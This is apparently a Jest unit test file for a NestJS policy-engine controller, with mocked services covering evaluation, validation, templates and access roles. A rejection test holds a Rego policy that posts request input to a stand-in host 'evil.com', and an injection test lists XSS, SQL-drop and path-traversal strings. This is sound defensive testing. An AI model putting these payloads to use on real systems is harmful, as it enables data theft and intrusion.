import { BadRequestException, ForbiddenException, NotFoundException } from '@nestjs/common';
import {
  AuthTestHelper,
  PerformanceTestHelper,
  SECURITY_TEST_CONSTANTS,
  SecurityTestHelper,
  TEST_USERS,
  TestUserRole,
} from '../../../../test/utils/test-helpers';
import type { PolicyContext } from '../interfaces/policy-engine.interface';
import { PolicyEngineController } from '../policy-engine.controller';
import { PolicyEngineService } from '../policy-engine.service';
import { PolicyTemplateService } from '../policy-template.service';

describe('PolicyEngineController', () => {
  let controller: PolicyEngineController;
  let policyEngineService: PolicyEngineService;
  let templateService: PolicyTemplateService;
  let authHelper: AuthTestHelper;

  // Mock services - following TypeORM/Jest pattern to avoid imports
  const mockPolicyEngineService = {
    evaluatePolicy: jest.fn(),
    evaluatePolicySet: jest.fn(),
    validatePolicy: jest.fn(),
    compilePolicy: jest.fn(),
    invalidateCache: jest.fn(),
  };

  const mockTemplateService = {
    getTemplates: jest.fn(),
    getCategories: jest.fn(),
    getFrameworks: jest.fn(),
    searchTemplates: jest.fn(),
    getTemplate: jest.fn(),
    validateTemplate: jest.fn(),
    createPolicyFromTemplate: jest.fn(),
  };

  const mockRequest = {
    user: TEST_USERS[TestUserRole.ADMIN],
  };

  beforeEach(async () => {
    // Manual instantiation pattern - required due to TypeORM/Jest incompatibility
    policyEngineService = mockPolicyEngineService as any;
    templateService = mockTemplateService as any;
    controller = new PolicyEngineController(policyEngineService, templateService);
    authHelper = new AuthTestHelper();

    // Reset all mocks before each test
    jest.clearAllMocks();
  });

  describe('Policy Evaluation', () => {
    describe('POST /evaluate/:policyId', () => {
      const mockContext: PolicyContext = {
        user: {
          id: 'user-123',
          roles: ['admin'],
          department: 'IT',
          clearanceLevel: 'HIGH',
        },
        resource: {
          type: 'document',
          classification: 'confidential',
          owner: 'user-456',
          tags: ['financial', 'sensitive'],
        },
        action: 'read',
        environment: {
          time: new Date().toISOString(),
          ipAddress: '192.168.1.100',
          location: 'US',
        },
      };

      it('should evaluate policy successfully with valid context', async () => {
        const mockResult = {
          decision: 'ALLOW',
          reasons: ['User has admin role', 'Resource is accessible'],
          obligations: ['Log access', 'Notify owner'],
          metadata: {
            evaluationTime: 25,
            policyVersion: '1.0',
          },
        };

        mockPolicyEngineService.evaluatePolicy.mockResolvedValue(mockResult);

        const result = await controller.evaluatePolicy('policy-123', mockContext);

        expect(mockPolicyEngineService.evaluatePolicy).toHaveBeenCalledWith(
          'policy-123',
          mockContext
        );
        expect(result).toEqual(mockResult);
      });

      it('should enforce performance benchmarks for policy evaluation', async () => {
        const mockResult = {
          decision: 'ALLOW',
          metadata: { evaluationTime: 45 },
        };

        mockPolicyEngineService.evaluatePolicy.mockResolvedValue(mockResult);

        const result = await controller.evaluatePolicy('policy-123', mockContext);

        expect(result.metadata.evaluationTime).toBeLessThan(
          SECURITY_TEST_CONSTANTS.MAX_POLICY_EVALUATION_TIME
        );
      });

      it('should handle policy not found error', async () => {
        mockPolicyEngineService.evaluatePolicy.mockRejectedValue(
          new NotFoundException('Policy not found')
        );

        await expect(controller.evaluatePolicy('non-existent', mockContext)).rejects.toThrow(
          NotFoundException
        );
      });

      it('should validate context structure before evaluation', async () => {
        const invalidContext = {
          // Missing required fields
          user: { id: 'user-123' },
          action: 'read',
        };

        mockPolicyEngineService.evaluatePolicy.mockRejectedValue(
          new BadRequestException('Invalid context: missing required fields')
        );

        await expect(
          controller.evaluatePolicy('policy-123', invalidContext as any)
        ).rejects.toThrow(BadRequestException);
      });

      // Security test: Broken Object Level Authorization (OWASP API1:2023)
      it('should prevent unauthorized access to policies from different organizations', async () => {
        const contextWithDifferentOrg = {
          ...mockContext,
          user: {
            ...mockContext.user,
            organizationId: 'different-org-456',
          },
        };

        mockPolicyEngineService.evaluatePolicy.mockRejectedValue(
          new ForbiddenException('Access denied: Policy belongs to different organization')
        );

        await expect(
          controller.evaluatePolicy('policy-123', contextWithDifferentOrg)
        ).rejects.toThrow(ForbiddenException);
      });
    });

    describe('POST /evaluate-set/:policySetId', () => {
      it('should evaluate policy set and return aggregated results', async () => {
        const mockContext: PolicyContext = {
          user: { id: 'user-123', roles: ['compliance_manager'] },
          resource: { type: 'report', classification: 'internal' },
          action: 'approve',
          environment: { time: new Date().toISOString() },
        };

        const mockResults = {
          overallDecision: 'ALLOW',
          policyResults: [
            { policyId: 'policy-1', decision: 'ALLOW' },
            { policyId: 'policy-2', decision: 'ALLOW' },
          ],
          conflictResolution: 'ALL_MUST_ALLOW',
        };

        mockPolicyEngineService.evaluatePolicySet.mockResolvedValue(mockResults);

        const result = await controller.evaluatePolicySet('set-123', mockContext);

        expect(result).toEqual(mockResults);
        expect(mockPolicyEngineService.evaluatePolicySet).toHaveBeenCalledWith(
          'set-123',
          mockContext
        );
      });

      it('should handle conflicting policy decisions', async () => {
        const mockContext: PolicyContext = {
          user: { id: 'user-123', roles: ['viewer'] },
          resource: { type: 'document', classification: 'confidential' },
          action: 'download',
          environment: { time: new Date().toISOString() },
        };

        const mockResults = {
          overallDecision: 'DENY',
          policyResults: [
            { policyId: 'policy-1', decision: 'ALLOW' },
            { policyId: 'policy-2', decision: 'DENY', reason: 'Insufficient clearance' },
          ],
          conflictResolution: 'ANY_DENY',
        };

        mockPolicyEngineService.evaluatePolicySet.mockResolvedValue(mockResults);

        const result = await controller.evaluatePolicySet('set-123', mockContext);

        expect(result.overallDecision).toBe('DENY');
      });
    });
  });

  describe('Policy Validation and Compilation', () => {
    describe('POST /validate', () => {
      it('should validate correct policy syntax', async () => {
        const validPolicyCode = `
          package policy.access
          
          default allow = false
          
          allow {
            input.user.roles[_] == "admin"
          }
        `;

        mockPolicyEngineService.validatePolicy.mockResolvedValue(true);

        const result = await controller.validatePolicy({ code: validPolicyCode });

        expect(result).toEqual({
          valid: true,
          message: 'Policy is valid',
        });
      });

      it('should reject policy with security violations', async () => {
        const maliciousPolicyCode = `
          package policy.access
          
          allow {
            http.send({"url": "http://evil.com", "method": "POST", "body": input})
          }
        `;

        mockPolicyEngineService.validatePolicy.mockResolvedValue(false);

        const result = await controller.validatePolicy({ code: maliciousPolicyCode });

        expect(result).toEqual({
          valid: false,
          message: 'Policy validation failed',
        });
      });

      it('should validate policy size limits', async () => {
        const largePolicyCode = 'a'.repeat(SECURITY_TEST_CONSTANTS.MAX_REQUEST_SIZE + 1);

        mockPolicyEngineService.validatePolicy.mockRejectedValue(
          new BadRequestException('Policy exceeds maximum size limit')
        );

        await expect(controller.validatePolicy({ code: largePolicyCode })).rejects.toThrow(
          BadRequestException
        );
      });
    });

    describe('POST /compile', () => {
      it('should compile valid policy and return rule', async () => {
        const policyCode = `
          package policy.data_classification
          
          classification[level] {
            input.data.contains_pii
            level := "confidential"
          }
        `;

        const mockCompiledRule = {
          id: 'rule-123',
          package: 'policy.data_classification',
          rules: ['classification'],
          compiledAt: new Date().toISOString(),
        };

        mockPolicyEngineService.compilePolicy.mockResolvedValue(mockCompiledRule);

        const result = await controller.compilePolicy({ code: policyCode });

        expect(result).toEqual({
          success: true,
          rule: mockCompiledRule,
        });
      });

      it('should handle compilation errors gracefully', async () => {
        const invalidPolicyCode = `
          package policy.invalid
          
          // Syntax error
          allow {
            input.user.roles[_] = "admin"  // Should be == not =
          }
        `;

        mockPolicyEngineService.compilePolicy.mockRejectedValue(
          new Error('Compilation error: Expected "==" but found "="')
        );

        const result = await controller.compilePolicy({ code: invalidPolicyCode });

        expect(result).toEqual({
          success: false,
          error: 'Compilation error: Expected "==" but found "="',
        });
      });

      it('should measure compilation performance', async () => {
        const policyCode = 'package test\nallow = true';

        mockPolicyEngineService.compilePolicy.mockImplementation(async () => {
          // Simulate compilation time
          await new Promise((resolve) => setTimeout(resolve, 20));
          return { id: 'rule-123' };
        });

        const { result, duration } = await PerformanceTestHelper.measureResponseTime(() =>
          controller.compilePolicy({ code: policyCode })
        );

        expect(duration).toBeLessThan(SECURITY_TEST_CONSTANTS.MAX_API_RESPONSE_TIME);
      });
    });
  });

  describe('Template Management', () => {
    describe('GET /templates', () => {
      it('should return all available templates', async () => {
        const mockTemplates = [
          {
            id: 'template-soc2-security',
            name: 'SOC2 Security Policy',
            category: 'security',
            framework: 'SOC2',
          },
          {
            id: 'template-iso-access',
            name: 'ISO 27001 Access Control',
            category: 'access-control',
            framework: 'ISO27001',
          },
        ];

        mockTemplateService.getTemplates.mockReturnValue(mockTemplates);

        const result = await controller.getTemplates();

        expect(result).toEqual(mockTemplates);
        expect(result).toHaveLength(2);
      });
    });

    describe('GET /templates/search', () => {
      it('should search templates by multiple criteria', async () => {
        const searchParams = {
          keyword: 'security',
          category: 'security',
          framework: 'SOC2',
        };

        const mockResults = [
          {
            id: 'template-1',
            name: 'SOC2 Information Security',
            score: 0.95,
          },
        ];

        mockTemplateService.searchTemplates.mockReturnValue(mockResults);

        const result = await controller.searchTemplates(
          searchParams.keyword,
          searchParams.category,
          searchParams.framework
        );

        expect(mockTemplateService.searchTemplates).toHaveBeenCalledWith(searchParams);
        expect(result).toEqual(mockResults);
      });

      it('should handle empty search results', async () => {
        mockTemplateService.searchTemplates.mockReturnValue([]);

        const result = await controller.searchTemplates('nonexistent');

        expect(result).toEqual([]);
      });
    });

    describe('POST /templates/:id/create-policy', () => {
      it('should create policy from template with customizations', async () => {
        const templateId = 'template-soc2';
        const customizations = {
          name: 'Custom Security Policy',
          description: 'Customized for our organization',
          parameters: {
            retentionPeriod: '7 years',
            encryptionRequired: true,
          },
          organizationId: 'org-123',
        };

        const mockCreatedPolicy = {
          id: 'policy-new-123',
          name: customizations.name,
          templateId,
          createdBy: TEST_USERS[TestUserRole.ADMIN].id,
          createdAt: new Date().toISOString(),
        };

        mockTemplateService.createPolicyFromTemplate.mockResolvedValue(mockCreatedPolicy);

        const result = await controller.createPolicyFromTemplate(
          templateId,
          customizations,
          mockRequest
        );

        expect(mockTemplateService.createPolicyFromTemplate).toHaveBeenCalledWith(templateId, {
          ...customizations,
          createdBy: TEST_USERS[TestUserRole.ADMIN].id,
        });
        expect(result).toEqual(mockCreatedPolicy);
      });

      it('should validate template parameters before creation', async () => {
        const customizations = {
          name: '', // Invalid: empty name
          organizationId: 'org-123',
        };

        mockTemplateService.createPolicyFromTemplate.mockRejectedValue(
          new BadRequestException('Policy name is required')
        );

        await expect(
          controller.createPolicyFromTemplate('template-123', customizations, mockRequest)
        ).rejects.toThrow(BadRequestException);
      });

      it('should track audit trail for policy creation', async () => {
        const auditInfo = {
          action: 'POLICY_CREATED_FROM_TEMPLATE',
          templateId: 'template-123',
          userId: TEST_USERS[TestUserRole.ADMIN].id,
          timestamp: new Date().toISOString(),
        };

        const mockCreatedPolicy = {
          id: 'policy-123',
          auditTrail: [auditInfo],
        };

        mockTemplateService.createPolicyFromTemplate.mockResolvedValue(mockCreatedPolicy);

        const result = await controller.createPolicyFromTemplate(
          'template-123',
          { organizationId: 'org-123' },
          mockRequest
        );

        expect(result.auditTrail).toBeDefined();
        expect(result.auditTrail[0].action).toBe('POLICY_CREATED_FROM_TEMPLATE');
      });
    });
  });

  describe('Cache Management', () => {
    describe('POST /cache/invalidate', () => {
      it('should invalidate cache for specific policy', async () => {
        mockPolicyEngineService.invalidateCache.mockResolvedValue(undefined);

        const result = await controller.invalidateCache({ policyId: 'policy-123' });

        expect(mockPolicyEngineService.invalidateCache).toHaveBeenCalledWith('policy-123');
        expect(result).toEqual({ message: 'Cache invalidated successfully' });
      });

      it('should invalidate entire cache when no policyId provided', async () => {
        mockPolicyEngineService.invalidateCache.mockResolvedValue(undefined);

        const result = await controller.invalidateCache({});

        expect(mockPolicyEngineService.invalidateCache).toHaveBeenCalledWith(undefined);
        expect(result).toEqual({ message: 'Cache invalidated successfully' });
      });

      it('should require admin role for cache invalidation', async () => {
        // This would be tested with proper guard implementation
        // For now, we verify the decorator is present
        const metadata = Reflect.getMetadata('roles', controller.invalidateCache);
        expect(metadata).toContain('admin');
      });
    });
  });

  describe('Security Tests', () => {
    it('should have proper role-based access control on all endpoints', () => {
      const protectedMethods = [
        { method: 'evaluatePolicy', expectedRoles: ['admin', 'compliance_manager', 'auditor'] },
        {
          method: 'validatePolicy',
          expectedRoles: ['admin', 'compliance_manager', 'policy_author'],
        },
        {
          method: 'getTemplates',
          expectedRoles: ['admin', 'compliance_manager', 'policy_author', 'viewer'],
        },
        { method: 'invalidateCache', expectedRoles: ['admin'] },
      ];

      protectedMethods.forEach(({ method, expectedRoles }) => {
        const roles = Reflect.getMetadata('roles', controller[method]);
        expect(roles).toBeDefined();
        expectedRoles.forEach((role) => {
          expect(roles).toContain(role);
        });
      });
    });

    it('should validate input data to prevent injection attacks', async () => {
      const maliciousInputs = [
        { code: '<script>alert("XSS")</script>' },
        { code: '"; DROP TABLE policies; --' },
        { code: '../../../etc/passwd' },
      ];

      for (const input of maliciousInputs) {
        mockPolicyEngineService.validatePolicy.mockResolvedValue(false);

        const result = await controller.validatePolicy(input);

        expect(result.valid).toBe(false);
      }
    });
  });
});
